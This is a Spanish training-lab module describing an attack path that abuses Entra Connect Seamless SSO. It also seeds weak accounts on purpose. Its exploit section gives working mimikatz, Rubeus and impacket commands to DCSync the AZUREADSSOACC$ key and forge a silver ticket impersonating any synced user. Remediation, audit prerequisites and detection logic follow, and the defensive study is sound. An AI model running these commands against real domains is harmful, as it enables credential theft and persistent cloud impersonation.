# AP06 — Entra Connect / Seamless SSO (AZUREADSSOACC$): el puente on-prem → cloud

**Capa:** Híbrido — AD DS on-prem + Microsoft Entra ID (Seamless SSO / Entra Connect) sobre el **mismo** DC Windows de AP05 (módulo `hybrid-ad`, substrato compartido vía `local.need_dc`)  
**Coste:** ruta de **cómputo** — **empata con AP05** como la ruta que factura una VM Windows always-on. AP06 **reutiliza el DC de AP05**: con `enable_ap05 = true` ya activo, AP06 añade **cero cómputo** (0 €/mes incrementales, comparte la misma VM); con AP05 apagado, AP06 **levanta él solo** ese único DC y factura igual que AP05 (`Standard_B2ms` ~0,083 €/h, ~60 €/mes 24×7; `Standard_B2s` como suelo ~30 €/mes; disco StandardSSD 127 GiB ~8-10 €/mes; IP pública Standard ~3-4 €/mes; ingesta de Log Analytics con el feed híbrido filtrado, pocos €/mes). Con **auto-shutdown** (2200) y uso ~8 h/día baja a ~⅓ → orientativo **~20-40 €/mes**; `./caelum.ps1 destroy` lo lleva a 0. No es «más caro» ni «más barato» que AP05: es la **misma** Vera de cómputo, compartida. (West Europe, pay-as-you-go — verifica el precio actual.)  
**MITRE ATT&CK:** [T1552](https://attack.mitre.org/techniques/T1552/) (Unsecured Credentials — *la credencial de la cuenta de sincronización de Entra Connect con derechos DCSync*) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync — *extraer las claves Kerberos de AZUREADSSOACC$*) · [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Steal or Forge Kerberos Tickets: Silver Ticket — *forjar el TGS de Seamless SSO*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *el ticket forjado autentica a la **nube***)  
**Mapea a cert:** CARTE / CRTE (identidad híbrida; abuso de Entra Connect + Seamless SSO; DCSync + forja de Kerberos; lado defensivo adyacente: SC-200 / Microsoft Defender for Identity)  
**Precondición sembrada por el range** (`enable_ap06 = true`; `sso_mode` por defecto `"both"`): sobre el DC híbrido compartido con AP05, `scripts/seed-ap06.ps1` (vía `az vm run-command` en el `deploy`, simetría exacta con `seed-ap05.ps1`) crea (a) la **cuenta de máquina de Seamless SSO** `AZUREADSSOACC$` con los SPN `HTTP/autologon.microsoftazuread-sso.com` y `HTTP/aadg.windows.net.nsatc.net` y una password **fija/conocida** (aterriza en el estado, output sensible `ap06_sso_password`) cuya clave RC4 es por tanto reproducible y **que ninguna entidad va a rotar**; y (b) la **cuenta de sincronización** `Sync_CAELUM` (análoga a `MSOL_`/`Sync_`) con una password conocida y las **ACE de DCSync** (`DS-Replication-Get-Changes` + `-All`) sobre el *domain NC*. **Lo que NO se siembra:** ninguna credencial de Domain Admin ni ningún tenant real — AP06 **no** sincroniza con Entra de verdad; la pata cloud se **declara no cubierta** (ver 🔵). La auditoría de los EventID nuevos (4662/4769/4741/4742) la habilita **el propio seed** (no la DSC base de AP05 → AP05 queda intacto).

---

## 🎯 Objetivo didáctico

Que el alumno interiorice la lección que **cierra el catálogo** y lo distingue de todo lo anterior: **el compromiso on-prem no se queda on-prem**. AP05 termina en *DCSync* — toma total del dominio Active Directory. AP06 usa ese mismo *DCSync* **no como destino, sino como peldaño**: la clave que extrae no es la de un usuario del bosque, es la de la cuenta `AZUREADSSOACC$`, cuya clave Kerberos está **compartida con Microsoft Entra ID**. Con ella se forja un ticket que **Entra valida como válido** → el atacante salta del Active Directory on-prem a la **identidad cloud** sin tocar jamás una contraseña de la nube ni el portal de Azure.

El eje conceptual es una debilidad estructural, no una mala configuración puntual: **la password de `AZUREADSSOACC$` nunca se rota por defecto.** Las cuentas de máquina normales rotan su clave cada ~30 días; `AZUREADSSOACC$` **no tiene ningún host que la rote** —es una cuenta de servicio que Entra Connect crea una vez y olvida—, así que su hash, robado **una sola vez**, es válido **para siempre**. Eso convierte un robo puntual en **persistencia eterna hacia la nube**: inmune a cambios de contraseña de los usuarios, a resets, a MFA del lado humano. El ticket se forja *offline* con la clave robada; Entra no distingue ese TGS forjado de uno legítimo porque ambos van cifrados con la **misma** clave de `AZUREADSSOACC$`.

La cadena de AP06 encadena cuatro técnicas en un único puente **on-prem → cloud**:

1. **T1552 — credencial de la cuenta de sync.** El punto de partida representa *«has comprometido el servidor de Entra Connect y volcado la credencial de sincronización»*. El lab la siembra (`Sync_CAELUM`) con password conocida y derechos **DCSync** sobre el dominio: es la primitiva de arranque del atacante.
2. **T1003.006 — DCSync de `AZUREADSSOACC$`.** Con esa credencial el atacante replica del DC las claves Kerberos (RC4/NT + AES) de la cuenta de Seamless SSO.
3. **T1558.001 — silver ticket.** Con la clave de `AZUREADSSOACC$` forja un TGS para `HTTP/autologon.microsoftazuread-sso.com` **suplantando a cualquier usuario sincronizado**, incluido uno privilegiado.
4. **T1550 — uso en la nube.** Ese TGS autentica a Entra como el usuario suplantado **sin su contraseña** → el salto on-prem → cloud está consumado, y la clave no-rotada garantiza que se pueda repetir indefinidamente.

Rompe **cualquier** eslabón (rotar la clave de `AZUREADSSOACC$`, retirar el DCSync de la cuenta de sync, securizar el servidor de Entra Connect) y la ruta muere: por eso la sección 🟢 ofrece varios cortes independientes.

**Contraste con AP05 (misma capa híbrida, mismo DC).** AP05 y AP06 comparten substrato —un único DC Windows en Azure IaaS— y comparten el verbo *DCSync*, pero la lección es la **opuesta**: AP05 es AD CS on-prem puro y **termina on-prem** (toma del bosque vía certificado forjado + PKINIT); AP06 trata el DCSync como **medio** para extraer una clave que **vive a caballo entre los dos mundos** y **salta a Entra**. Donde AP05 enseña «una plantilla mal configurada = toma de dominio», AP06 enseña «una cuenta de servicio de SSO con clave no-rotada = puente permanente del AD on-prem a tu tenant». Es, además, la **segunda ruta híbrida** del range y la que lo **cierra**.

---

## 🔴 Rompe (cómo se explota)

> Laboratorio de entrenamiento autorizado, tenant/subscription de test propios. El bosque `caelum.lab` está **aislado** y **no** se sincroniza con ningún tenant real: AP06 **simula** la superficie de Entra Connect / Seamless SSO on-prem (la cuenta `AZUREADSSOACC$` y la cuenta de sync) para ejercitar la cadena de robo y forja; la validación efectiva contra `login.microsoftonline.com` queda **fuera de alcance** (ver el límite declarado en 🔵). Todos los pasos parten de la credencial de la cuenta de sincronización `Sync_CAELUM` (lo que el range entrega como «ya has comprometido el servidor de Entra Connect»).

La cadena canónica es `cred de sync → DCSync de AZUREADSSOACC$ → silver ticket para el SPN de Seamless SSO → auth a la nube`. Como en AP05, el range contempla **dos posturas de red** según lo que abra el operador en el NSG.

### Vía A — Windows nativo por RDP (UX primaria, sin exponer puertos AD)

El NSG del módulo **no** abre LDAP/Kerberos/RPC a Internet. La ruta pensada es RDP al DC (desde `admin_source_cidr`) y ejecutar las herramientas Windows-nativas. Referencia: **mimikatz** (`lsadump::dcsync` + `kerberos::golden` en modo silver) y **Rubeus** (GhostPack).

```powershell
# RDP a <ap06_dc_public_ip> (origen = admin_source_cidr)

# 1. DCSync de AZUREADSSOACC$ usando la credencial de sync comprometida.
#    (mimikatz corriendo bajo un contexto que presente la cred de Sync_CAELUM:
#     runas /netonly, o pasar sus claves por pass-the-hash previo.)
.\mimikatz.exe "lsadump::dcsync /domain:caelum.lab /user:AZUREADSSOACC$" exit
#   → copia el NTLM (clave RC4) y las claves AES128/AES256 de AZUREADSSOACC$
#     NOTA: AZUREADSSOACC$ termina en '$' (es una cuenta de MÁQUINA, no de usuario).

# 2. Averiguar el SID de dominio y el UPN del usuario (sincronizado) a suplantar.
#    El silver ticket de Seamless SSO suplanta a un usuario del tenant por su identidad on-prem.
whoami /user   # o Get-ADDomain para el SID base del dominio

# 3. Forjar el SILVER TICKET para el SPN de Seamless SSO con la clave RC4 robada.
#    target = autologon.microsoftazuread-sso.com ; service = HTTP ; rc4 = NTLM de AZUREADSSOACC$
.\mimikatz.exe "kerberos::golden /user:<usuario_a_suplantar> /domain:caelum.lab ^
  /sid:<SID_dominio> /target:autologon.microsoftazuread-sso.com ^
  /service:HTTP /rc4:<NTLM_de_AZUREADSSOACC$> /ptt" exit
#   (análogo con Rubeus: `Rubeus.exe silver /service:HTTP/autologon.microsoftazuread-sso.com
#    /rc4:<NTLM> /user:<usuario> /domain:caelum.lab /sid:<SID> /ptt`)

# 4. Usar el TGS forjado para autenticar a Entra (pata cloud: FUERA del lab).
#    En un entorno real, el cliente presentaría este ticket al endpoint de Seamless SSO
#    y Entra lo validaría con la MISMA clave de AZUREADSSOACC$ → sesión como <usuario_a_suplantar>.
```

### Vía B — remoto con impacket / Rubeus (solo si el operador abrió los puertos AD a `admin_source_cidr`)

Si el operador relaja el NSG para exponer LDAP/Kerberos/RPC a su `/32`, el flujo equivalente desde una caja Linux del atacante con **impacket** (`secretsdump`) + **Rubeus**/**ticketer**:

```bash
# 1. DCSync de AZUREADSSOACC$ con la cred de sync (DCSync sembrado sobre el domain NC)
impacket-secretsdump 'caelum.lab/Sync_CAELUM:<sync_pass>@<ap06_dc_public_ip>' \
  -just-dc-user 'CAELUM/AZUREADSSOACC$'
#   → aes256/aes128/NTLM de AZUREADSSOACC$

# 2. Forjar el silver ticket para el SPN de Seamless SSO (impacket-ticketer)
#    -nthash: la clave RC4 robada ; -spn: el SPN de autologon ; -domain-sid: SID del bosque
impacket-ticketer -nthash '<NTLM_de_AZUREADSSOACC$>' \
  -domain-sid '<SID_dominio>' -domain 'caelum.lab' \
  -spn 'HTTP/autologon.microsoftazuread-sso.com' '<usuario_a_suplantar>'
#   → <usuario_a_suplantar>.ccache (el TGS de Seamless SSO forjado)

# 3. (Pata cloud — FUERA del lab) presentar el ticket al endpoint de Seamless SSO de Entra.
```

> **Caveat — RC4 sí, AES precomputado NO.** La clave **RC4/NT** de `AZUREADSSOACC$` es *determinista* a partir de la password conocida: `RC4 = MD4(UTF16LE(password))`. Las claves **AES128/AES256**, en cambio, se derivan con un *salt* que incluye el *realm* y el nombre de la cuenta (host), así que **no** son triviales de precomputar entre dominios. Por eso la forja usa la clave **RC4** (`/rc4`, `-nthash`), o bien las claves **AES que el propio DCSync devuelve** (ya salteadas correctamente por el DC). **No** intentes sembrar ni precomputar una clave AES fija: usa RC4 para el forge rápido o las AES obtenidas en el paso de DCSync.

> **Caveat — un silver ticket forjado *offline* no siempre toca el DC.** El TGS se fabrica con la clave robada **sin pedírselo al KDC**, de modo que el evento `4769` (TGS Request) a menudo **no aparece** en el DC durante el ataque. Esto es *load-bearing* para la detección (ver 🔵): el `4769` es un *hunt/booster*, nunca un *gate*. La huella fiable del ataque es el **`4662` del DCSync** sobre `AZUREADSSOACC$`, no el `4769`.

> **Caveat — `AZUREADSSOACC` es una cuenta de MÁQUINA.** `sAMAccountName = AZUREADSSOACC$` (con `$`), objeto *computer*, con los dos SPN de Seamless SSO fijados en la creación. No es un usuario. Si se siembra o se busca como usuario, la detección y el forge fallan.

> **Caveat — propagación / auto-shutdown.** Ejecuta `deploy` + ataque en la misma sesión: una VM *deallocada* por el auto-shutdown (2200) no sirve RDP ni `az vm run-command`, y el DCPromo + el seed tardan en quedar listos tras el primer `apply` (el seed de AP06 corre *post-apply*, como el de AP05).

### Variantes — `sso_mode`

La variable `sso_mode` (análoga a `leak_mode`/`runbook_mode`) decide **qué artefactos** siembra el lab, y por tanto **qué tramo** de la cadena se ejercita:

| `sso_mode` | Qué se siembra | Lección acotada |
|---|---|---|
| `silver_ticket` | Solo `AZUREADSSOACC$` (clave fija no-rotada + SPN) | Foco en **forjar** el TGS de Seamless SSO (se asume ya tienes la clave) |
| `sync_dcsync` | Solo la cuenta de sync `Sync_CAELUM` con ACE **DCSync** sobre el NC | Foco en **extraer** la credencial de Entra Connect → DCSync |
| `both` *(default)* | Ambos artefactos | **Cadena completa** sync → DCSync → claves de `AZUREADSSOACC$` → silver ticket → nube |

El default `both` es el único que honra el **mapa MITRE completo** de AP06 (T1552 + T1003.006 + T1558.001 + T1550). `silver_ticket` y `sync_dcsync` son **subconjuntos idempotentes** de `both` para despliegues compartidos más acotados o lecciones dirigidas.

### Salto a la nube

Con el silver ticket de Seamless SSO el atacante se autentica a Entra **como el usuario suplantado** (si es un usuario sincronizado con rol privilegiado en el tenant, hereda ese privilegio en la nube). El compromiso on-prem ha **saltado** a la identidad cloud, y —clave— la **clave no-rotada** de `AZUREADSSOACC$` convierte ese salto en **persistencia**: mientras no se rote esa clave, el atacante puede re-forjar tickets y re-entrar a la nube indefinidamente, con independencia de cuántas veces cambien su contraseña los usuarios.

---

## 🟢 Arregla (remediación)

Cada una de estas acciones **corta el puente por separado**. Aplícalas en profundidad — cualquiera de las tres primeras rompe la cadena de forma independiente (igual que en AP05 cada corte mata ESC1).

1. **Rotar la clave Kerberos de `AZUREADSSOACC$` — DOS veces (el antídoto directo).** Es el fix oficial de Microsoft: *rolar la decryption key de Seamless SSO dos veces* invalida (a) cualquier hash ya robado y (b) cualquier silver ticket **ya forjado**. La doble rotación es necesaria porque Kerberos conserva la clave anterior (N-1) para validar tickets en vuelo; rotar una sola vez dejaría la clave robada válida una ventana más. En el range, `scripts/seed-ap06.ps1 -Remediate` hace `Set-ADAccountPassword -Identity 'AZUREADSSOACC$' -Reset` **dos veces** con password aleatoria fresca. En producción, el procedimiento es el *rollover* de la clave de descifrado de Seamless SSO de **Azure AD Connect** (no un simple reset manual).

2. **Retirar los derechos DCSync de la cuenta de sincronización.** Quitar las ACE `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) y `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) de `Sync_CAELUM` sobre el *domain NC* corta la capacidad de **re-extraer** las claves de `AZUREADSSOACC$`. Ambas ACE son necesarias para un DCSync funcional, así que quitar **cualquiera** de las dos ya rompe la primitiva.

3. **Securizar / retirar la cuenta de sync y su servidor (tratar Entra Connect como *tier-0*).** Deshabilitar o borrar la cuenta `MSOL_`/`Sync_` comprometida y endurecer el servidor de Entra Connect (es, de facto, un sistema de nivel DC: custodia una credencial con DCSync). En el lab, `-Remediate` hace `Disable-ADAccount`/`Remove-ADUser` de la cuenta de sync.

4. **Monitorizar `4662` sobre `AZUREADSSOACC$` (defensa en profundidad / detección como control).** Una alerta sobre el DCSync de `AZUREADSSOACC$` por una cuenta distinta de la sync legítima detecta el ataque en su paso **más fiable** (ver 🔵). Complementar con la higiene de PHS/PTA y, si se opera Seamless SSO, con un *rollover* periódico de su clave de descifrado.

> **La lección de remediación de AP06 (espejo de AP05).** No hay un «único parche»: hay **varios cortes independientes**, y la defensa robusta aplica más de uno. La diferencia con AP05 es *dónde* corta cada uno — aquí no se neutraliza una plantilla, se **rompe el puente** entre el AD on-prem y el tenant cloud.

### Remediación in-place en el range (el ejercicio «Arregla»)

`scripts/seed-ap06.ps1 -Remediate` corrige los artefactos de AP06 **dejando el DC/telemetría en pie**, para que el alumno re-ejecute el ataque y la detección contra el estado corregido y compruebe que el silver ticket ya no se puede re-forjar (clave rotada) ni la cuenta de sync re-extraer claves (DCSync retirado). Aplica los tres cortes a la vez: (A) rota la clave de `AZUREADSSOACC$` **dos veces**; (B) quita las dos ACE de replicación de la cuenta de sync sobre el NC (con el mismo *gotcha* del **binary form** de `nTSecurityDescriptor` que documenta `seed-ap05.ps1` — hay que escribir con `Set-ADObject -Replace @{ nTSecurityDescriptor = $sd.GetSecurityDescriptorBinaryForm() }`, no pasar el objeto de seguridad directamente); (C) deshabilita/borra la cuenta de sync. Cada rama hace *early-return* si el objeto no existe (idempotente, re-ejecutable). Invocación simétrica con el seed del `deploy`:

```bash
az vm run-command invoke \
  -g <ap06_resource_group> -n <ap06_dc_vm_name> \
  --command-id RunPowerShellScript \
  --scripts @scripts/seed-ap06.ps1 \
  --parameters Remediate=true EaPassword='<ap06_dc_admin_password>' \
               DomainFqdn=caelum.lab DomainNetbios=CAELUM \
               SsoAccountName=AZUREADSSOACC SyncAccountName=Sync_CAELUM
```

> **Dos niveles de reset — no los confundas (y OJO al caso selectivo, propio del substrato compartido).**
>
> **(1) Duro / coste→0:** `./caelum.ps1 reset` re-aplica con `enable_ap06 = false` **y** `enable_ap05 = false`. Solo cuando **ambas** flags son `false`, `local.need_dc` evalúa `false` (`count = 0`) → Terraform **destruye el único DC compartido** y con él, atómicamente, `AZUREADSSOACC$`, la cuenta de sync y las ACE de DCSync del NC (viven en el **directorio** del DC destruido, **no** en el `tfstate`) → reset sin residuo *out-of-state*, coste posterior cero. Es la misma propiedad de limpieza que anuncian AP05/AP07/AP08 (AP06 la **comparte**, no la reclama en exclusiva). Por eso `reset` **debe** incluir `-var enable_ap06=false` junto al `enable_ap05=false` existente: con el DC compartido, olvidar la flag de AP06 dejaría el DC en pie.
>
> **(2) In-place / pedagógico:** `seed-ap06.ps1 -Remediate` (arriba). Como en AP05, `./caelum.ps1 reset` **no** pre-remedia AP06 por `run-command` (la vuln vive en la VM destruible, que además puede estar *deallocada* por el auto-shutdown y haría fallar el `run-command`).
>
> **Caso selectivo — la trampa del substrato compartido.** Apagar **solo** AP06 (`enable_ap06=false` con `enable_ap05=true`) deja `need_dc = true` → **el DC sobrevive** y los objetos AD de AP06 (`AZUREADSSOACC$`, la cuenta de sync) **persisten**, porque no son recursos de Terraform. Para el «Arregla» en ese caso **hay que** correr `seed-ap06.ps1 -Remediate` **antes** de bajar la flag. Terraform destruye el DC solo cuando caen **las dos** flags.

---

## 🔵 Detecta

La fuente son **eventos de Seguridad de Windows** del DC híbrido (on-prem — igual que AP05, **no** hay logs cloud dentro del lab). AP06 **reutiliza el pipeline que ya existe para AP05**: **Azure Monitor Agent (AMA)** + **Data Collection Rule (DCR)** + **Log Analytics**, con el filtro xPath del DCR **ampliado solo cuando `enable_ap06 = true`** para añadir los EventID de AP06 **sin alterar** el filtro de AP05 (que queda byte-a-byte idéntico cuando AP06 está apagado). Tabla KQL: **`SecurityEvent`**.

- KQL (Sentinel / Defender XDR): [`../../detections/kql/AP06-entra-connect-seamless-sso.kql`](../../detections/kql/AP06-entra-connect-seamless-sso.kql)
- Sigma: [`../../detections/sigma/AP06-entra-connect-seamless-sso.yml`](../../detections/sigma/AP06-entra-connect-seamless-sso.yml)

**Señales (tabla `SecurityEvent`):**

| Señal | EventID | Qué mirar |
|---|---|---|
| **DCSync de `AZUREADSSOACC$`** (la estrella) | `4662` | `Properties` contiene el GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (`DS-Replication-Get-Changes`) y/o `1131f6ad-...` (`-All`); `SubjectUserName` = la cuenta de sync, sobre el NC / `AZUREADSSOACC$`. **Es la firma fiable del ataque.** |
| TGS para el SPN de Seamless SSO (*hunt*) | `4769` | `ServiceName` = `AZUREADSSOACC$` o `HTTP/autologon.microsoftazuread-sso.com`; interés en `TicketEncryptionType = 0x17` (RC4). **Caveat fuerte: un silver ticket forjado *offline* NO siempre genera `4769`** → *hunt/booster*, **nunca** un *gate*. |
| Creación / cambio de `AZUREADSSOACC$` | `4741` / `4742` | `TargetUserName` contiene `AZUREADSSOACC` — el defensor **ve plantarse** la cuenta de Seamless SSO (espejo de `4899/4900` en AP05) |
| `AZUREADSSOACC$` con `PasswordLastSet` **antiguo** (*property hunt*) | — | **No event-driven**: requiere consulta LDAP periódica. Una cuenta de Seamless SSO cuya clave nunca cambia = el *tell* de la no-rotación. Complemento declarado, no señal de `SecurityEvent`. |

**Prerrequisito imprescindible (lo habilita `seed-ap06.ps1`, NO la DSC base de AP05 → AP05 intacto):** `auditpol /set` de las subcategorías *Directory Service Access* (Success+Failure, para `4662`), *Kerberos Service Ticket Operations* (Success, para `4769`) y *Computer Account Management* (Success, para `4741/4742`); y, para que el `4662` del DCSync se registre de verdad, una **SACL** adecuada sobre el *domain NC*. Sin esto, **los eventos no se generan** y la detección falla en vacío (la misma lección de prerrequisito de auditoría que AP05).

**Lógica de correlación (lección de AP04/AP05/AP07): OR / `union`, nunca un `inner join` global.** Las tres señales son **independientes** y disparan por sí solas: (a) `4662` con los GUID de replicación por una cuenta de sync = la firma del DCSync; (b) un `4769` para el SPN de Seamless SSO; (c) un `4741/4742` sobre `AZUREADSSOACC$` fuera de una ventana aprobada. El KQL las une con `union isfuzzy=true | sort by TimeGenerated asc`. Una correlación temporal de alta fidelidad (`4662` del DCSync sobre `AZUREADSSOACC$` ⇒ dentro de una ventana ⇒ `4769` del SPN SSO) se incluye **comentada**, precisamente porque el silver ticket puede **no** producir `4769` — jamás se convierte en un `AND` que descarte en silencio la cadena.

**Falsos positivos a *allowlistar*:** la **sincronización legítima de Azure AD Connect** genera `4662` con esos mismos GUID de replicación desde su cuenta de sync real → en producción se *allowlistea* la cuenta de sync conocida (en el lab, el DCSync de la cuenta sembrada **es** la señal). Los *sign-ins* legítimos de Seamless SSO son el *baseline* esperado de `4769` (por eso es *hunt*). El *rollover* aprobado de la clave de `AZUREADSSOACC$` produce `4741/4742` benignos.

> **Límite declarado — la pata CLOUD NO está cubierta por el lab (espejo exacto de los límites que declara AP05).** La autenticación efectiva a la nube con el ticket forjado se vería en **Entra ID `SigninLogs`** (sign-ins de Seamless SSO contra `autologon.microsoftazuread-sso.com`) y/o `AADServicePrincipalSignInLogs`, pero el range **no provisiona** el tenant ni Entra Connect real → **AP06 cubre solo la pata on-prem** (`SecurityEvent`). Igual que AP05 declara que no hay `AuditLogs`/`SigninLogs` de Entra, AP06 lo declara explícitamente. **Complemento gestionado:** **Microsoft Defender for Identity** trae detección **nativa** de *Suspected DCSync attack* y de *Suspected Golden/Silver Ticket* sobre los DC con sensor — recomendada junto a estas reglas; y, si existe un tenant, una KQL companion sobre `SigninLogs` cerraría la pata cloud.

> **Caveat del esquema `SecurityEvent`.** Las propiedades del `4662` (los GUID de replicación) viven en el campo `Properties`/`EventData` (según cómo promueva el pipeline los campos del XML); el `4769` puede requerir extraer `ServiceName`/`TicketEncryptionType` del XML si el DCR no los promueve. El KQL lo contempla con `contains` sobre `Properties`.

> **Coste de ingesta.** El feed híbrido queda muy por debajo de 0,1-0,3 GB/día → pocos €/mes (31 d de retención incluidos); AP06 **añade** 4 EventID al filtro de AP05 solo cuando está activo. Filtra **siempre** el xPath del DCR a esos EventID: un canal *Security* sin filtrar dispara el coste de Log Analytics. Se desactiva con `collect_security_events = false` o apuntando a un workspace externo.

---

## 📚 Referencias

- Dirk-jan Mollema (*dirkjanm*) — *Updating adconnectdump* / análisis de Seamless SSO y `AZUREADSSOACC$` (la clave compartida con Entra y su no-rotación): [dirkjanm.io](https://dirkjanm.io/) · *Abusing Azure AD SSO with the Primary Refresh Token* (contexto de identidad híbrida)
- Microsoft — [Azure AD Connect: Seamless Single Sign-On — FAQ y *key rollover*](https://learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-sso) (procedimiento oficial de *rollover* de la decryption key de Seamless SSO; la cuenta `AZUREADSSOACC$`)
- Microsoft — [Microsoft Defender for Identity](https://learn.microsoft.com/defender-for-identity/) (*Suspected DCSync attack*, *Suspected Golden/Silver Ticket* — detección gestionada en el DC)
- SpecterOps / HarmJ0y — *Kerberoasting* y *forging silver tickets* (base técnica del TGS forjado con clave de servicio)
- Herramientas: **mimikatz** (`lsadump::dcsync`, `kerberos::golden` en modo silver), **Rubeus** (`silver`/`asktgt`), **impacket** (`secretsdump`, `ticketer`), **BloodHound** (aristas de sync/DCSync), **AADInternals** (tooling específico de Seamless SSO / `AZUREADSSOACC$`)
- MITRE ATT&CK — [T1552](https://attack.mitre.org/techniques/T1552/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/), [T1558.001](https://attack.mitre.org/techniques/T1558/001/), [T1550](https://attack.mitre.org/techniques/T1550/)
- Comparar con [AP05](./AP05-adcs-esc1.md) — **mismo DC híbrido, misma capa de cómputo** (AP06 reutiliza el substrato de AP05; ambas facturan la VM). AP05 **termina** en DCSync on-prem; AP06 usa el DCSync como **peldaño** para saltar a Entra (on-prem → cloud). AP06 **cierra el catálogo** y es la **2ª ruta híbrida** del range.
